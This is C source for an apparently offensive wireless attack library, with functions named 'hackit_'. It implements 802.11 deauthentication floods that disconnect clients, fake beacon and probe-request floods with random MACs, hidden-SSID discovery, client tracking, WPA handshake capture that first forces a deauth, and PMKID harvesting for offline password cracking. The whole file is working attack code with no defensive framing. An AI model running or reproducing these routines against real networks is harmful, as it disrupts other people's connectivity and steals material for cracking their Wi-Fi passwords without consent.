#include "offensive_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>

#define FRAME_BUF_SIZE 4096
#define DOT11_FC_BEACON     0x0080
#define DOT11_FC_PROBE_REQ  0x0040
#define DOT11_FC_DEAUTH     0x00C0
#define DOT11_FC_AUTH       0x00B0
#define DOT11_FC_PROBE_RESP 0x0050

typedef struct __attribute__((packed)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} dot11_hdr;

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static int _set_channel(const char* iface, int ch) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "iw dev %s set channel %d 2>/dev/null", iface, ch);
    return system(cmd);
}

static uint64_t _now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void _rand_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = rand() & 0xFF;
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

int hackit_send_deauth(const char* iface, hackit_deauth_params* params) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t frame[FRAME_BUF_SIZE];
    dot11_hdr* hdr = (dot11_hdr*)frame;
    hdr->frame_control = DOT11_FC_DEAUTH;
    hdr->duration = 0;
    memcpy(hdr->addr1, params->target_sta[0] ? params->target_sta : (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(hdr->addr2, params->target_bssid, 6);
    memcpy(hdr->addr3, params->target_bssid, 6);
    hdr->seq_ctrl = 0;
    frame[24] = params->reason_code & 0xFF;
    frame[25] = (params->reason_code >> 8) & 0xFF;
    int frame_len = 26;
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    dest.sll_protocol = htons(ETH_P_ALL);
    for (int i = 0; i < params->count; i++) {
        hdr->seq_ctrl = (i & 0xFFF) << 4;
        sendto(fd, frame, frame_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        usleep(params->interval_ms * 1000);
    }
    close(fd);
    return 0;
}

int hackit_flood_beacon(const char* iface, hackit_beacon_flood_params* params) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t frame[FRAME_BUF_SIZE];
    _set_channel(iface, params->channel);
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    for (int i = 0; i < params->count; i++) {
        for (int s = 0; s < params->ssid_count; s++) {
            memset(frame, 0, sizeof(frame));
            dot11_hdr* hdr = (dot11_hdr*)frame;
            hdr->frame_control = DOT11_FC_BEACON;
            hdr->duration = 0;
            memcpy(hdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            uint8_t bssid[6];
            _rand_mac(bssid);
            memcpy(hdr->addr2, bssid, 6);
            memcpy(hdr->addr3, bssid, 6);
            hdr->seq_ctrl = (i & 0xFFF) << 4;
            int off = 24;
            uint64_t t = time(NULL);
            memcpy(frame+off, &t, 8); off += 8;
            uint16_t beacon_int = 100;
            memcpy(frame+off, &beacon_int, 2); off += 2;
            uint16_t caps = params->capabilities ? params->capabilities : 0x0431;
            memcpy(frame+off, &caps, 2); off += 2;
            int ssid_len = strlen(params->ssids[s]);
            if (ssid_len > 32) ssid_len = 32;
            frame[off++] = 0;
            frame[off++] = ssid_len;
            memcpy(frame+off, params->ssids[s], ssid_len); off += ssid_len;
            frame[off++] = 1;
            frame[off++] = 8;
            uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
            memcpy(frame+off, rates, 8); off += 8;
            frame[off++] = 3;
            frame[off++] = 1;
            frame[off++] = params->channel;
            sendto(fd, frame, off, 0, (struct sockaddr*)&dest, sizeof(dest));
            usleep(params->interval_ms * 1000);
        }
    }
    close(fd);
    return 0;
}

int hackit_flood_probe(const char* iface, hackit_probe_flood_params* params) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t frame[FRAME_BUF_SIZE];
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    for (int i = 0; i < params->count; i++) {
        for (int s = 0; s < params->ssid_count; s++) {
            memset(frame, 0, sizeof(frame));
            dot11_hdr* hdr = (dot11_hdr*)frame;
            hdr->frame_control = DOT11_FC_PROBE_REQ;
            hdr->duration = 0;
            memcpy(hdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            uint8_t mac[6]; _rand_mac(mac);
            memcpy(hdr->addr2, mac, 6);
            memcpy(hdr->addr3, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            hdr->seq_ctrl = (i & 0xFFF) << 4;
            int off = 24;
            int ssid_len = strlen(params->ssids[s]);
            if (ssid_len > 32) ssid_len = 32;
            frame[off++] = 0;
            frame[off++] = ssid_len;
            memcpy(frame+off, params->ssids[s], ssid_len); off += ssid_len;
            sendto(fd, frame, off, 0, (struct sockaddr*)&dest, sizeof(dest));
            usleep(params->interval_ms * 1000);
        }
    }
    close(fd);
    return 0;
}

int hackit_find_hidden_ssid(const char* iface, int timeout_sec, hackit_ap_info* results, int* count) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t buf[FRAME_BUF_SIZE];
    int found = 0;
    int max_results = *count;
    uint64_t end = _now_ms() + timeout_sec * 1000;
    while (_now_ms() < end) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) { usleep(10000); continue; }
        if (n < 24) continue;
        dot11_hdr* hdr = (dot11_hdr*)buf;
        if (hdr->frame_control != DOT11_FC_BEACON && hdr->frame_control != DOT11_FC_PROBE_RESP)
            continue;
        int off = 24 + 12;
        while (off + 2 <= n) {
            if (buf[off] == 0 && off + 2 + buf[off+1] <= n) {
                int ssid_len = buf[off+1];
                if (ssid_len == 0 && found < max_results) {
                    memcpy(results[found].bssid, hdr->addr2, 6);
                    results[found].channel = 0;
                    found++;
                } else if (ssid_len > 0) {
                    for (int i = 0; i < found; i++) {
                        if (memcmp(results[i].bssid, hdr->addr2, 6) == 0) {
                            memset(results[i].bssid, 0, 6);
                        }
                    }
                }
            }
            off += 2 + buf[off+1];
        }
    }
    *count = found;
    close(fd);
    return 0;
}

int hackit_hunt_clients(const char* iface, int timeout_sec, hackit_client_info* results, int* count) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t buf[FRAME_BUF_SIZE];
    int found = 0;
    int max_results = *count;
    uint64_t end = _now_ms() + timeout_sec * 1000;
    while (_now_ms() < end) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) { usleep(10000); continue; }
        if (n < 24) continue;
        dot11_hdr* hdr = (dot11_hdr*)buf;
        uint16_t fc = hdr->frame_control;
        int is_probe = (fc & 0x00F0) == 0x0040;
        int is_auth = (fc & 0x00F0) == 0x00B0;
        if (!is_probe && !is_auth) continue;
        int dup = 0;
        for (int i = 0; i < found; i++) {
            if (memcmp(results[i].client_mac, hdr->addr2, 6) == 0) {
                dup = 1; results[i].probe_count++; break;
            }
        }
        if (!dup && found < max_results) {
            memcpy(results[found].client_mac, hdr->addr2, 6);
            results[found].probe_count = 1;
            found++;
        }
    }
    *count = found;
    close(fd);
    return 0;
}

int hackit_capture_handshake(const char* iface, hackit_handshake_params* params) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    if (params->deauth) {
        hackit_deauth_params dp;
        memcpy(dp.target_bssid, params->target_bssid, 6);
        memset(dp.target_sta, 0, 6);
        dp.reason_code = 7;
        dp.count = 5;
        dp.interval_ms = 100;
        hackit_send_deauth(iface, &dp);
    }
    uint8_t buf[FRAME_BUF_SIZE];
    uint64_t end = _now_ms() + params->timeout_sec * 1000;
    FILE* f = params->output_file[0] ? fopen(params->output_file, "wb") : NULL;
    while (_now_ms() < end) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) { usleep(10000); continue; }
        if (f) fwrite(buf, 1, n, f);
    }
    if (f) fclose(f);
    close(fd);
    return 0;
}

int hackit_harvest_pmkid(const char* iface, hackit_pmkid_params* params) {
    int fd = _raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t buf[FRAME_BUF_SIZE];
    uint64_t end = _now_ms() + params->timeout_sec * 1000;
    FILE* f = params->output_file[0] ? fopen(params->output_file, "wb") : NULL;
    while (_now_ms() < end) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) { usleep(10000); continue; }
        if (n < 100) continue;
        dot11_hdr* hdr = (dot11_hdr*)buf;
        if ((hdr->frame_control & 0x00F0) != 0x00B0) continue;
        int off = 24;
        while (off + 2 <= n) {
            if (buf[off] == 48 && off + 14 <= n && buf[off+9] == 0x20) {
                if (f) fwrite(buf, 1, n, f);
                break;
            }
            if (buf[off] == 221 && off + 4 + buf[off+1] <= n) {
                if (memcmp(buf+off+2, "\x00\x50\xF2\x04\x10\x4A", 6) == 0 && buf[off+9] == 0x00) {
                    if (f) fwrite(buf, 1, n, f);
                    break;
                }
            }
            off += 2 + buf[off+1];
        }
    }
    if (f) fclose(f);
    close(fd);
    return 0;
}
